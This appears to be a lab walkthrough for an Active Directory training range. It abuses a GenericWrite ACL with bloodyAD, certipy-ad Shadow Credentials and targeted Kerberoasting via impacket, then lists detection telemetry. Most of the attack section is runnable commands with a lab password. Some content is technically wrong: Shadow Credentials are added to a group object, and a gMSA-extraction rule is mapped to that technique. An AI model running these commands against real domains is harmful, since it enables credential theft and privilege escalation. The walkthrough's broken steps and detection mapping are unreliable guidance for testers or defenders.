# WT#014 — ACL GenericWrite

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01) |
| **Domain** | cadre.local |
| **Starting Credential** | analyst_cloud / Cl0ud_An@lyst! (Cloud-Cadre member) |
| **Tools Required** | bloodyAD, certipy-ad |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1098 |
| **Difficulty** | Medium |

## Prerequisites
- Cloud-Cadre group has GenericWrite on Agentic-Cadre group
- analyst_cloud is a member of Cloud-Cadre

## Attack Steps

### Step 1 — Verify the ACL
```bash
# From kali, use bloodyAD to list ACEs on Agentic-Cadre
bloodyAD --host dc01.cadre.local -d cadre.local -u analyst_cloud -p 'Cl0ud_An@lyst!' get aces 'CN=Agentic-Cadre,OU=Agentic,DC=cadre,DC=local'

# Expected: Cloud-Cadre has GenericWrite permission on Agentic-Cadre
```

### Step 2 — GenericWrite exploitation via Shadow Credentials
```bash
# GenericWrite on a group means we can modify the group object
# Strategy: Add Shadow Credentials to the group's msDS-KeyCredentialLink
# If the group has members with privileged access, we can target them

# Add Shadow Credentials to Agentic-Cadre group members
# Check Agentic-Cadre members first
bloodyAD --host dc01.cadre.local -d cadre.local -u analyst_cloud -p 'Cl0ud_An@lyst!' get group 'Agentic-Cadre'

# Agentic-Cadre currently has eng_agentic as member
# Since we have GenericWrite on the group, we can:
# 1. Add Shadow Credentials to eng_agentic (if eng_agentic uses this group for auth decisions)
#    OR
# 2. Add ourselves (analyst_cloud) to Agentic-Cadre first

# Add Shadow Credentials to the Agentic-Cadre group itself
certipy-ad shadow add -u 'analyst_cloud@cadre.local' -p 'Cl0ud_An@lyst!' -target 'Agentic-Cadre' -dc-ip 192.168.77.10
```

### Step 3 — Alternative: Targeted Kerberoasting or SPN modification
```bash
# GenericWrite lets us write the servicePrincipalName attribute
# Add an SPN to a member of Agentic-Cadre, then Kerberoast them

# Add SPN to eng_agentic
bloodyAD --host dc01.cadre.local -d cadre.local -u analyst_cloud -p 'Cl0ud_An@lyst!' set attribute 'CN=eng_agentic,OU=Agentic,DC=cadre,DC=local' servicePrincipalName -v 'HTTP/agentic-target.cadre.local'

# Now Kerberoast eng_agentic
impacket-GetUserSPNs cadre.local/analyst_cloud:'Cl0ud_An@lyst!' -dc-ip 192.168.77.10 -request
```

## Post-Exploitation Chain
WT#014 → Shadow Credentials on Agentic-Cadre → authenticate as group member → escalate via group membership chain → DA

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`, `logs-windows.sysmon_operational-*`
- **Expected Events:**
  - Event ID 5136: Directory object modification (msDS-KeyCredentialLink or servicePrincipalName written)
  - Event ID 4738: User account changed (SPN added)
  - Event ID 4769: Kerberos TGS request for the newly added SPN
  - Sysmon EID 1: certipy-ad, bloodyAD, python process
- **Elastic Detection Rule:** `cadre-008-gmsa-extract` on `event.code:4662 AND winlog.event_data.ObjectType:msDS-ManagedPassword` (applies to Shadow Credentials technique)
- **Zeek:** `kerberos.log` with TGS-REQ for Kerberoast SPN

## Status
CONFIGURED
